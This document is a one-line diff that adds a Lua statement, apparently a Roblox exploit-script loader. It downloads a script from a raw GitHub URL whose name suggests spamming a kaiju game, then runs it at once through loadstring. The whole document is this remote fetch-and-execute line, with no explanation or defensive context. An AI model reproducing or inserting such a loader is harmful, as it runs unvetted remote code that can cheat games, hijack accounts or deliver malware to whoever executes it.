@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/mechagodzilla2021-remodel-kaiju-alpha-spam5-9l7z2pvkof2x0e.lua"))()
